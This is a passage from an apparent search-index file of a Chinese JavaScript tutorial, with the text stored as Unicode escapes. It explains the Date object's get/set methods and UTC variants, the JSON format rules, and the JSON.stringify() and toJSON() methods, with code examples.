\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6700\u540e\u4e00\u884c\u8fd4\u56de -480 \uff0c\u5373 UTC \u65f6\u95f4\u51cf\u53bb\u5f53\u524d\u65f6\u95f4\uff0c\u5355\u4f4d\u662f\u5206\u949f\u3002 -480 \u8868\u793a UTC \u6bd4\u5f53\u524d\u65f6\u95f4\u5c11480\u5206\u949f\uff0c\u5373\u5f53\u524d\u65f6\u533a\u6bd4 UTC \u65e98\u4e2a\u5c0f\u65f6\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u8ba1\u7b97\u672c\u5e74\u5ea6\u8fd8\u5269\u4e0b\u591a\u5c11\u5929\u3002 1 2 3 4 5 6 function leftDays () { var today = new Date (); var endYear = new Date ( today . getFullYear (), 11 , 31 , 23 , 59 , 59 , 999 ); var msPerDay = 24 * 60 * 60 * 1000 ; return Math . round (( endYear . getTime () - today . getTime ()) / msPerDay ); } \u4e0a\u9762\u8fd9\u4e9b get* \u65b9\u6cd5\u8fd4\u56de\u7684\u90fd\u662f\u5f53\u524d\u65f6\u533a\u7684\u65f6\u95f4\uff0c Date \u5bf9\u8c61\u8fd8\u63d0\u4f9b\u4e86\u8fd9\u4e9b\u65b9\u6cd5\u5bf9\u5e94\u7684 UTC \u7248\u672c\uff0c\u7528\u6765\u8fd4\u56de UTC \u65f6\u95f4\u3002 getUTCDate() getUTCFullYear() getUTCMonth() getUTCDay() getUTCHours() getUTCMinutes() getUTCSeconds() getUTCMilliseconds() 1 2 3 4 var d = new Date ( 'January 6, 2013' ); d . getDate () // 6 d . getUTCDate () // 5 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9e\u4f8b\u5bf9\u8c61 d \u8868\u793a\u5f53\u524d\u65f6\u533a\uff08\u4e1c\u516b\u65f6\u533a\uff09\u76841\u67086\u65e50\u70b90\u52060\u79d2\uff0c\u8fd9\u4e2a\u65f6\u95f4\u5bf9\u4e8e\u5f53\u524d\u65f6\u533a\u6765\u8bf4\u662f1\u67086\u65e5\uff0c\u6240\u4ee5 getDate \u65b9\u6cd5\u8fd4\u56de6\uff0c\u5bf9\u4e8e UTC \u65f6\u533a\u6765\u8bf4\u662f1\u67085\u65e5\uff0c\u6240\u4ee5 getUTCDate \u65b9\u6cd5\u8fd4\u56de5\u3002","title":"get \u7c7b\u65b9\u6cd5"},{"location":"stdlib/date/#set","text":"Date \u5bf9\u8c61\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217 set* \u65b9\u6cd5\uff0c\u7528\u6765\u8bbe\u7f6e\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5404\u4e2a\u65b9\u9762\u3002 setDate(date) \uff1a\u8bbe\u7f6e\u5b9e\u4f8b\u5bf9\u8c61\u5bf9\u5e94\u7684\u6bcf\u4e2a\u6708\u7684\u51e0\u53f7\uff081-31\uff09\uff0c\u8fd4\u56de\u6539\u53d8\u540e\u6beb\u79d2\u65f6\u95f4\u6233\u3002 setFullYear(year [, month, date]) \uff1a\u8bbe\u7f6e\u56db\u4f4d\u5e74\u4efd\u3002 setHours(hour [, min, sec, ms]) \uff1a\u8bbe\u7f6e\u5c0f\u65f6\uff080-23\uff09\u3002 setMilliseconds() \uff1a\u8bbe\u7f6e\u6beb\u79d2\uff080-999\uff09\u3002 setMinutes(min [, sec, ms]) \uff1a\u8bbe\u7f6e\u5206\u949f\uff080-59\uff09\u3002 setMonth(month [, date]) \uff1a\u8bbe\u7f6e\u6708\u4efd\uff080-11\uff09\u3002 setSeconds(sec [, ms]) \uff1a\u8bbe\u7f6e\u79d2\uff080-59\uff09\u3002 setTime(milliseconds) \uff1a\u8bbe\u7f6e\u6beb\u79d2\u65f6\u95f4\u6233\u3002 \u8fd9\u4e9b\u65b9\u6cd5\u57fa\u672c\u662f\u8ddf get* \u65b9\u6cd5\u4e00\u4e00\u5bf9\u5e94\u7684\uff0c\u4f46\u662f\u6ca1\u6709 setDay \u65b9\u6cd5\uff0c\u56e0\u4e3a\u661f\u671f\u51e0\u662f\u8ba1\u7b97\u51fa\u6765\u7684\uff0c\u800c\u4e0d\u662f\u8bbe\u7f6e\u7684\u3002\u53e6\u5916\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u51e1\u662f\u6d89\u53ca\u5230\u8bbe\u7f6e\u6708\u4efd\uff0c\u90fd\u662f\u4ece0\u5f00\u59cb\u7b97\u7684\uff0c\u5373 0 \u662f1\u6708\uff0c 11 \u662f12\u6708\u3002 1 2 3 4 5 var d = new Date ( 'January 6, 2013' ); d // Sun Jan 06 2013 00:00:00 GMT+0800 (CST) d . setDate ( 9 ) // 1357660800000 d // Wed Jan 09 2013 00:00:00 GMT+0800 (CST) set* \u65b9\u6cd5\u7684\u53c2\u6570\u90fd\u4f1a\u81ea\u52a8\u6298\u7b97\u3002\u4ee5 setDate() \u4e3a\u4f8b\uff0c\u5982\u679c\u53c2\u6570\u8d85\u8fc7\u5f53\u6708\u7684\u6700\u5927\u5929\u6570\uff0c\u5219\u5411\u4e0b\u4e00\u4e2a\u6708\u987a\u5ef6\uff0c\u5982\u679c\u53c2\u6570\u662f\u8d1f\u6570\uff0c\u8868\u793a\u4ece\u4e0a\u4e2a\u6708\u7684\u6700\u540e\u4e00\u5929\u5f00\u59cb\u51cf\u53bb\u7684\u5929\u6570\u3002 1 2 3 4 5 6 7 8 9 var d1 = new Date ( 'January 6, 2013' ); d1 . setDate ( 32 ) // 1359648000000 d1 // Fri Feb 01 2013 00:00:00 GMT+0800 (CST) var d2 = new Date ( 'January 6, 2013' ); d2 . setDate ( - 1 ) // 1356796800000 d2 // Sun Dec 30 2012 00:00:00 GMT+0800 (CST) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c d1.setDate(32) \u5c06\u65e5\u671f\u8bbe\u4e3a1\u6708\u4efd\u768432\u53f7\uff0c\u56e0\u4e3a1\u6708\u4efd\u53ea\u670931\u53f7\uff0c\u6240\u4ee5\u81ea\u52a8\u6298\u7b97\u4e3a2\u67081\u65e5\u3002 d2.setDate(-1) \u8868\u793a\u8bbe\u4e3a\u4e0a\u4e2a\u6708\u7684\u5012\u6570\u7b2c\u4e8c\u5929\uff0c\u537312\u670830\u65e5\u3002 set \u7c7b\u65b9\u6cd5\u548c get \u7c7b\u65b9\u6cd5\uff0c\u53ef\u4ee5\u7ed3\u5408\u4f7f\u7528\uff0c\u5f97\u5230\u76f8\u5bf9\u65f6\u95f4\u3002 1 2 3 4 5 6 7 8 var d = new Date (); // \u5c06\u65e5\u671f\u5411\u540e\u63a81000\u5929 d . setDate ( d . getDate () + 1000 ); // \u5c06\u65f6\u95f4\u8bbe\u4e3a6\u5c0f\u65f6\u540e d . setHours ( d . getHours () + 6 ); // \u5c06\u5e74\u4efd\u8bbe\u4e3a\u53bb\u5e74 d . setFullYear ( d . getFullYear () - 1 ); set* \u7cfb\u5217\u65b9\u6cd5\u9664\u4e86 setTime() \uff0c\u90fd\u6709\u5bf9\u5e94\u7684 UTC \u7248\u672c\uff0c\u5373\u8bbe\u7f6e UTC \u65f6\u533a\u7684\u65f6\u95f4\u3002 setUTCDate() setUTCFullYear() setUTCHours() setUTCMilliseconds() setUTCMinutes() setUTCMonth() setUTCSeconds() 1 2 3 4 var d = new Date ( 'January 6, 2013' ); d . getUTCHours () // 16 d . setUTCHours ( 22 ) // 1357423200000 d // Sun Jan 06 2013 06:00:00 GMT+0800 (CST) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u672c\u5730\u65f6\u533a\uff08\u4e1c\u516b\u65f6\u533a\uff09\u76841\u67086\u65e50\u70b90\u5206\uff0c\u662f UTC \u65f6\u533a\u7684\u524d\u4e00\u5929\u4e0b\u534816\u70b9\u3002\u8bbe\u4e3a UTC \u65f6\u533a\u768422\u70b9\u4ee5\u540e\uff0c\u5c31\u53d8\u4e3a\u672c\u5730\u65f6\u533a\u7684\u4e0a\u53486\u70b9\u3002","title":"set \u7c7b\u65b9\u6cd5"},{"location":"stdlib/date/#_6","text":"Rakhitha Nimesh\uff0c Getting Started with the Date Object Ilya Kantor, Date/Time functions","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"stdlib/json/","text":"JSON \u5bf9\u8c61 \u00b6 JSON \u683c\u5f0f \u00b6 JSON \u683c\u5f0f\uff08JavaScript Object Notation \u7684\u7f29\u5199\uff09\u662f\u4e00\u79cd\u7528\u4e8e\u6570\u636e\u4ea4\u6362\u7684\u6587\u672c\u683c\u5f0f\uff0c2001\u5e74\u7531 Douglas Crockford \u63d0\u51fa\uff0c\u76ee\u7684\u662f\u53d6\u4ee3\u7e41\u7410\u7b28\u91cd\u7684 XML \u683c\u5f0f\u3002 \u76f8\u6bd4 XML \u683c\u5f0f\uff0cJSON \u683c\u5f0f\u6709\u4e24\u4e2a\u663e\u8457\u7684\u4f18\u70b9\uff1a\u4e66\u5199\u7b80\u5355\uff0c\u4e00\u76ee\u4e86\u7136\uff1b\u7b26\u5408 JavaScript \u539f\u751f\u8bed\u6cd5\uff0c\u53ef\u4ee5\u7531\u89e3\u91ca\u5f15\u64ce\u76f4\u63a5\u5904\u7406\uff0c\u4e0d\u7528\u53e6\u5916\u6dfb\u52a0\u89e3\u6790\u4ee3\u7801\u3002\u6240\u4ee5\uff0cJSON \u8fc5\u901f\u88ab\u63a5\u53d7\uff0c\u5df2\u7ecf\u6210\u4e3a\u5404\u5927\u7f51\u7ad9\u4ea4\u6362\u6570\u636e\u7684\u6807\u51c6\u683c\u5f0f\uff0c\u5e76\u88ab\u5199\u5165\u6807\u51c6\u3002 \u6bcf\u4e2a JSON \u5bf9\u8c61\u5c31\u662f\u4e00\u4e2a\u503c\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u6570\u7ec4\u6216\u5bf9\u8c61\uff0c\u4e5f\u53ef\u80fd\u662f\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\u3002\u603b\u4e4b\uff0c\u53ea\u80fd\u662f\u4e00\u4e2a\u503c\uff0c\u4e0d\u80fd\u662f\u4e24\u4e2a\u6216\u66f4\u591a\u7684\u503c\u3002 JSON \u5bf9\u503c\u7684\u7c7b\u578b\u548c\u683c\u5f0f\u6709\u4e25\u683c\u7684\u89c4\u5b9a\u3002 \u590d\u5408\u7c7b\u578b\u7684\u503c\u53ea\u80fd\u662f\u6570\u7ec4\u6216\u5bf9\u8c61\uff0c\u4e0d\u80fd\u662f\u51fd\u6570\u3001\u6b63\u5219\u8868\u8fbe\u5f0f\u5bf9\u8c61\u3001\u65e5\u671f\u5bf9\u8c61\u3002 \u539f\u59cb\u7c7b\u578b\u7684\u503c\u53ea\u6709\u56db\u79cd\uff1a\u5b57\u7b26\u4e32\u3001\u6570\u503c\uff08\u5fc5\u987b\u4ee5\u5341\u8fdb\u5236\u8868\u793a\uff09\u3001\u5e03\u5c14\u503c\u548c null \uff08\u4e0d\u80fd\u4f7f\u7528 NaN , Infinity , -Infinity \u548c undefined \uff09\u3002 \u5b57\u7b26\u4e32\u5fc5\u987b\u4f7f\u7528\u53cc\u5f15\u53f7\u8868\u793a\uff0c\u4e0d\u80fd\u4f7f\u7528\u5355\u5f15\u53f7\u3002 \u5bf9\u8c61\u7684\u952e\u540d\u5fc5\u987b\u653e\u5728\u53cc\u5f15\u53f7\u91cc\u9762\u3002 \u6570\u7ec4\u6216\u5bf9\u8c61\u6700\u540e\u4e00\u4e2a\u6210\u5458\u7684\u540e\u9762\uff0c\u4e0d\u80fd\u52a0\u9017\u53f7\u3002 \u4ee5\u4e0b\u90fd\u662f\u5408\u6cd5\u7684 JSON\u3002 1 2 3 4 5 6 7 [ \"one\" , \"two\" , \"three\" ] { \"one\" : 1 , \"two\" : 2 , \"three\" : 3 } { \"names\" : [ \"\u5f20\u4e09\" , \"\u674e\u56db\" ] } [ { \"name\" : \"\u5f20\u4e09\" }, { \"name\" : \"\u674e\u56db\" } ] \u4ee5\u4e0b\u90fd\u662f\u4e0d\u5408\u6cd5\u7684 JSON\u3002 1 2 3 4 5 6 7 8 9 10 11 12 { name : \"\u5f20\u4e09\" , 'age' : 32 } // \u5c5e\u6027\u540d\u5fc5\u987b\u4f7f\u7528\u53cc\u5f15\u53f7 [ 32 , 64 , 128 , 0xFFF ] // \u4e0d\u80fd\u4f7f\u7528\u5341\u516d\u8fdb\u5236\u503c { \"name\" : \"\u5f20\u4e09\" , \"age\" : undefined } // \u4e0d\u80fd\u4f7f\u7528 undefined { \"name\" : \"\u5f20\u4e09\" , \"birthday\" : new Date ( 'Fri, 26 Aug 2011 07:13:10 GMT' ), \"getName\" : function () { return this . name ; } } // \u5c5e\u6027\u503c\u4e0d\u80fd\u4f7f\u7528\u51fd\u6570\u548c\u65e5\u671f\u5bf9\u8c61 \u6ce8\u610f\uff0c null \u3001\u7a7a\u6570\u7ec4\u548c\u7a7a\u5bf9\u8c61\u90fd\u662f\u5408\u6cd5\u7684 JSON \u503c\u3002 JSON \u5bf9\u8c61 \u00b6 JSON \u5bf9\u8c61\u662f JavaScript \u7684\u539f\u751f\u5bf9\u8c61\uff0c\u7528\u6765\u5904\u7406 JSON \u683c\u5f0f\u6570\u636e\u3002\u5b83\u6709\u4e24\u4e2a\u9759\u6001\u65b9\u6cd5\uff1a JSON.stringify() \u548c JSON.parse() \u3002 JSON.stringify() \u00b6 \u57fa\u672c\u7528\u6cd5 \u00b6 JSON.stringify() \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a\u503c\u8f6c\u4e3a JSON \u5b57\u7b26\u4e32\u3002\u8be5\u5b57\u7b26\u4e32\u7b26\u5408 JSON \u683c\u5f0f\uff0c\u5e76\u4e14\u53ef\u4ee5\u88ab JSON.parse() \u65b9\u6cd5\u8fd8\u539f\u3002 1 2 3 4 5 6 7 8 9 10 11 JSON . stringify ( 'abc' ) // \"\"abc\"\" JSON . stringify ( 1 ) // \"1\" JSON . stringify ( false ) // \"false\" JSON . stringify ([]) // \"[]\" JSON . stringify ({}) // \"{}\" JSON . stringify ([ 1 , \"false\" , false ]) // '[1,\"false\",false]' JSON . stringify ({ name : \"\u5f20\u4e09\" }) // '{\"name\":\"\u5f20\u4e09\"}' \u4e0a\u9762\u4ee3\u7801\u5c06\u5404\u79cd\u7c7b\u578b\u7684\u503c\uff0c\u8f6c\u6210 JSON \u5b57\u7b26\u4e32\u3002 \u6ce8\u610f\uff0c\u5bf9\u4e8e\u539f\u59cb\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\uff0c\u8f6c\u6362\u7ed3\u679c\u4f1a\u5e26\u53cc\u5f15\u53f7\u3002 1 2 JSON . stringify ( 'foo' ) === \"foo\" // false JSON . stringify ( 'foo' ) === \"\\\"foo\\\"\" // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 foo \uff0c\u88ab\u8f6c\u6210\u4e86 \"\\\"foo\\\"\" \u3002\u8fd9\u662f\u56e0\u4e3a\u5c06\u6765\u8fd8\u539f\u7684\u65f6\u5019\uff0c\u5185\u5c42\u53cc\u5f15\u53f7\u53ef\u4ee5\u8ba9 JavaScript \u5f15\u64ce\u77e5\u9053\uff0c\u8fd9\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u800c\u4e0d\u662f\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u3002 1 2 JSON . stringify ( false ) // \"false\" JSON . stringify ( 'false' ) // \"\\\"false\\\"\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u4e0d\u662f\u5185\u5c42\u7684\u53cc\u5f15\u53f7\uff0c\u5c06\u6765\u8fd8\u539f\u7684\u65f6\u5019\uff0c\u5f15\u64ce\u5c31\u65e0\u6cd5\u77e5\u9053\u539f\u59cb\u503c\u662f\u5e03\u5c14\u503c\u8fd8\u662f\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u5bf9\u8c61\u7684\u5c5e\u6027\u662f undefined \u3001\u51fd\u6570\u6216 XML \u5bf9\u8c61\uff0c\u8be5\u5c5e\u6027\u4f1a\u88ab JSON.stringify() \u8fc7\u6ee4\u3002 1 2 3 4 5 6 var obj = { a : undefined , b : function () {} }; JSON . stringify ( obj ) // \"{}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7684 a \u5c5e\u6027\u662f undefined \uff0c\u800c b \u5c5e\u6027\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u7ed3\u679c\u90fd\u88ab JSON.stringify \u8fc7\u6ee4\u3002 \u5982\u679c\u6570\u7ec4\u7684\u6210\u5458\u662f undefined \u3001\u51fd\u6570\u6216 XML \u5bf9\u8c61\uff0c\u5219\u8fd9\u4e9b\u503c\u88ab\u8f6c\u6210 null \u3002 1 2 var arr = [ undefined , function () {}]; JSON . stringify ( arr ) // \"[null,null]\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4 arr \u7684\u6210\u5458\u662f undefined \u548c\u51fd\u6570\uff0c\u5b83\u4eec\u90fd\u88ab\u8f6c\u6210\u4e86 null \u3002 \u6b63\u5219\u5bf9\u8c61\u4f1a\u88ab\u8f6c\u6210\u7a7a\u5bf9\u8c61\u3002 1 JSON . stringify ( /foo/ ) // \"{}\" JSON.stringify() \u65b9\u6cd5\u4f1a\u5ffd\u7565\u5bf9\u8c61\u7684\u4e0d\u53ef\u904d\u5386\u7684\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var obj = {}; Object . defineProperties ( obj , { 'foo' : { value : 1 , enumerable : true }, 'bar' : { value : 2 , enumerable : false } }); JSON . stringify ( obj ); // \"{\"foo\":1}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c bar \u662f obj \u5bf9\u8c61\u7684\u4e0d\u53ef\u904d\u5386\u5c5e\u6027\uff0c JSON.stringify \u65b9\u6cd5\u4f1a\u5ffd\u7565\u8fd9\u4e2a\u5c5e\u6027\u3002 \u7b2c\u4e8c\u4e2a\u53c2\u6570 \u00b6 JSON.stringify() \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u6570\u7ec4\uff0c\u4f5c\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u6307\u5b9a\u53c2\u6570\u5bf9\u8c61\u7684\u54ea\u4e9b\u5c5e\u6027\u9700\u8981\u8f6c\u6210\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 10 var obj = { 'prop1' : 'value1' , 'prop2' : 'value2' , 'prop3' : 'value3' }; var selectedProperties = [ 'prop1' , 'prop2' ]; JSON . stringify ( obj , selectedProperties ) // \"{\"prop1\":\"value1\",\"prop2\":\"value2\"}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c JSON.stringify() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\uff0c\u53ea\u8f6c prop1 \u548c prop2 \u4e24\u4e2a\u5c5e\u6027\u3002 \u8fd9\u4e2a\u7c7b\u4f3c\u767d\u540d\u5355\u7684\u6570\u7ec4\uff0c\u53ea\u5bf9\u5bf9\u8c61\u7684\u5c5e\u6027\u6709\u6548\uff0c\u5bf9\u6570\u7ec4\u65e0\u6548\u3002 1 2 3 4 5 JSON . stringify ([ 'a' , 'b' ], [ '0' ]) // \"[\"a\",\"b\"]\" JSON . stringify ({ 0 : 'a' , 1 : 'b' }, [ '0' ]) // \"{\"0\":\"a\"}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a JSON \u683c\u5f0f\u53ea\u8f6c 0 \u53f7\u5c5e\u6027\uff0c\u5b9e\u9645\u4e0a\u5bf9\u6570\u7ec4\u662f\u65e0\u6548\u7684\uff0c\u53ea\u5bf9\u5bf9\u8c61\u6709\u6548\u3002 \u7b2c\u4e8c\u4e2a\u53c2\u6570\u8fd8\u53ef\u4ee5\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u6765\u66f4\u6539 JSON.stringify() \u7684\u8fd4\u56de\u503c\u3002 1 2 3 4 5 6 7 8 9 function f ( key , value ) { if ( typeof value === \"number\" ) { value = 2 * value ; } return value ; } JSON . stringify ({ a : 1 , b : 2 }, f ) // '{\"a\": 2,\"b\": 4}' \u4e0a\u9762\u4ee3\u7801\u4e2d\u7684 f \u51fd\u6570\uff0c\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u5206\u522b\u662f\u88ab\u8f6c\u6362\u7684\u5bf9\u8c61\u7684\u952e\u540d\u548c\u952e\u503c\u3002\u5982\u679c\u952e\u503c\u662f\u6570\u503c\uff0c\u5c31\u5c06\u5b83\u4e58\u4ee5 2 \uff0c\u5426\u5219\u5c31\u539f\u6837\u8fd4\u56de\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e2a\u5904\u7406\u51fd\u6570\u662f\u9012\u5f52\u5904\u7406\u6240\u6709\u7684\u952e\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var obj = { a : { b : 1 }}; function f ( key , value ) { console . log ( \"[\" + key + \"]:\" + value ); return value ; } JSON . stringify ( obj , f ) // []:[object Object] // [a]:[object Object] // [b]:1 // '{\"a\":{\"b\":1}}' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u4e00\u5171\u4f1a\u88ab f \u51fd\u6570\u5904\u7406\u4e09\u6b21\uff0c\u8f93\u51fa\u7684\u6700\u540e\u90a3\u884c\u662f JSON.stringify() \u7684\u9ed8\u8ba4\u8f93\u51fa\u3002\u7b2c\u4e00\u6b21\u952e\u540d\u4e3a\u7a7a\uff0c\u952e\u503c\u662f\u6574\u4e2a\u5bf9\u8c61 obj \uff1b\u7b2c\u4e8c\u6b21\u952e\u540d\u4e3a a \uff0c\u952e\u503c\u662f {b: 1} \uff1b\u7b2c\u4e09\u6b21\u952e\u540d\u4e3a b \uff0c\u952e\u503c\u4e3a1\u3002 \u9012\u5f52\u5904\u7406\u4e2d\uff0c\u6bcf\u4e00\u6b21\u5904\u7406\u7684\u5bf9\u8c61\uff0c\u90fd\u662f\u524d\u4e00\u6b21\u8fd4\u56de\u7684\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = { a : 1 }; function f ( key , value ) { if ( typeof value === 'object' ) { return { b : 2 }; } return value * 2 ; } JSON . stringify ( obj , f ) // \"{\"b\": 4}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c f \u51fd\u6570\u4fee\u6539\u4e86\u5bf9\u8c61 obj \uff0c\u63a5\u7740 JSON.stringify() \u65b9\u6cd5\u5c31\u9012\u5f52\u5904\u7406\u4fee\u6539\u540e\u7684\u5bf9\u8c61 obj \u3002 \u5982\u679c\u5904\u7406\u51fd\u6570\u8fd4\u56de undefined \u6216\u6ca1\u6709\u8fd4\u56de\u503c\uff0c\u5219\u8be5\u5c5e\u6027\u4f1a\u88ab\u5ffd\u7565\u3002 1 2 3 4 5 6 7 8 9 function f ( key , value ) { if ( typeof ( value ) === \"string\" ) { return undefined ; } return value ; } JSON . stringify ({ a : \"abc\" , b : 123 }, f ) // '{\"b\": 123}' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u5c5e\u6027\u7ecf\u8fc7\u5904\u7406\u540e\uff0c\u8fd4\u56de undefined \uff0c\u4e8e\u662f\u8be5\u5c5e\u6027\u88ab\u5ffd\u7565\u4e86\u3002 \u7b2c\u4e09\u4e2a\u53c2\u6570 \u00b6 JSON.stringify() \u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u7528\u4e8e\u589e\u52a0\u8fd4\u56de\u7684 JSON \u5b57\u7b26\u4e32\u7684\u53ef\u8bfb\u6027\u3002 \u9ed8\u8ba4\u8fd4\u56de\u7684\u662f\u5355\u884c\u5b57\u7b26\u4e32\uff0c\u5bf9\u4e8e\u5927\u578b\u7684 JSON \u5bf9\u8c61\uff0c\u53ef\u8bfb\u6027\u975e\u5e38\u5dee\u3002\u7b2c\u4e09\u4e2a\u53c2\u6570\u4f7f\u5f97\u6bcf\u4e2a\u5c5e\u6027\u5355\u72ec\u5360\u636e\u4e00\u884c\uff0c\u5e76\u4e14\u5c06\u6bcf\u4e2a\u5c5e\u6027\u524d\u9762\u6dfb\u52a0\u6307\u5b9a\u7684\u524d\u7f00\uff08\u4e0d\u8d85\u8fc710\u4e2a\u5b57\u7b26\uff09\u3002 1 2 3 4 5 6 7 8 9 10 // \u9ed8\u8ba4\u8f93\u51fa JSON . stringify ({ p1 : 1 , p2 : 2 }) // JSON.stringify({ p1: 1, p2: 2 }) // \u5206\u884c\u8f93\u51fa JSON . stringify ({ p1 : 1 , p2 : 2 }, null , '\\t' ) // { // \"p1\": 1, // \"p2\": 2 // } \u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0c\u7b2c\u4e09\u4e2a\u5c5e\u6027 \\t \u5728\u6bcf\u4e2a\u5c5e\u6027\u524d\u9762\u6dfb\u52a0\u4e00\u4e2a\u5236\u8868\u7b26\uff0c\u7136\u540e\u5206\u884c\u663e\u793a\u3002 \u7b2c\u4e09\u4e2a\u5c5e\u6027\u5982\u679c\u662f\u4e00\u4e2a\u6570\u5b57\uff0c\u5219\u8868\u793a\u6bcf\u4e2a\u5c5e\u6027\u524d\u9762\u6dfb\u52a0\u7684\u7a7a\u683c\uff08\u6700\u591a\u4e0d\u8d85\u8fc710\u4e2a\uff09\u3002 1 2 3 4 5 6 7 JSON . stringify ({ p1 : 1 , p2 : 2 }, null , 2 ); /* \"{ \"p1\": 1, \"p2\": 2 }\" */ \u53c2\u6570\u5bf9\u8c61\u7684 toJSON() \u65b9\u6cd5 \u00b6 \u5982\u679c\u53c2\u6570\u5bf9\u8c61\u6709\u81ea\u5b9a\u4e49\u7684 toJSON() \u65b9\u6cd5\uff0c\u90a3\u4e48 JSON.stringify() \u4f1a\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u800c\u5ffd\u7565\u539f\u5bf9\u8c61\u7684\u5176\u4ed6\u5c5e\u6027\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u666e\u901a\u7684\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 var user = { firstName : '\u4e09' , lastName : '\u5f20' , get fullName (){ return this . lastName + this . firstName ; } }; JSON . stringify ( user ) // \"{\"firstName\":\"\u4e09\",\"lastName\":\"\u5f20\",\"fullName\":\"\u5f20\u4e09\"}\" \u73b0\u5728\uff0c\u4e3a\u8fd9\u4e2a\u5bf9\u8c61\u52a0\u4e0a toJSON() \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var user = { firstName : '\u4e09' , lastName : '\u5f20' , get fullName (){ return this . lastName + this . firstName ; }, toJSON : function () { return { name : this . lastName + this . firstName }; } }; JSON . stringify ( user ) // \"{\"name\":\"\u5f20\u4e09\"}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c JSON.stringify() \u53d1\u73b0\u53c2\u6570\u5bf9\u8c61\u6709 toJSON() \u65b9\u6cd5\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u800c\u5ffd\u7565\u539f\u5bf9\u8c61\u7684\u5176\u4ed6\u53c2\u6570\u3002 Date \u5bf9\u8c61\u5c31\u6709\u4e00\u4e2a\u81ea\u5df1\u7684 toJSON() \u65b9\u6cd5\u3002 1 2 3 var date = new Date ( '2015-01-01' ); date . toJSON () // \"2015-01-01T00:00:00.000Z\" JSON . stringify ( date ) // \"\"2015-01-01T00:00:00.000Z\"\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c JSON.stringify() \u53d1\u73b0\u5904\u7406\u7684\u662f Date \u5bf9\u8c61\u5b9e\u4f8b\uff0c\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u7684 toJSON() \u65b9\u6cd5\uff0c\u5c06\u8be5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4f5c\u4e3a\u53c2\u6570\u3002 toJSON() \u65b9\u6cd5\u7684\u4e00\u4e2a\u5e94\u7528\u662f\uff0c\u5c06\u6b63\u5219\u5bf9\u8c61\u81ea\u52a8\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002\u56e0\u4e3a JSON.stringify() \u9ed8\u8ba4\u4e0d\u80fd\u8f6c\u6362\u6b63\u5219\u5bf9\u8c61\uff0c\u4f46\u662f\u8bbe\u7f6e\u4e86 toJSON() \u65b9\u6cd5\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u8f6c\u6362\u6b63\u5219\u5bf9\u8c61\u4e86\u3002 1 2 3 4 5 6 7 8 9 10 var obj = { reg : /foo/ }; // \u4e0d\u8bbe\u7f6e toJSON \u65b9\u6cd5\u65f6 JSON . stringify ( obj ) // \"{\"reg\":{}}\" // \u8bbe\u7f6e toJSON \u65b9\u6cd5\u65f6 RegExp . prototype . toJSON = RegExp . prototype . toString ; JSON . stringify ( /foo/ ) // \"\"/foo/\"\" \u4e0a\u9762\u4ee3\u7801\u5728\u6b63\u5219\u5bf9\u8c61\u7684\u539f\u578b\u4e0a\u9762\u90e8\u7f72\u4e86 toJSON() \u65b9\u6cd5\uff0c\u5c06\u5176\u6307\u5411 toString() 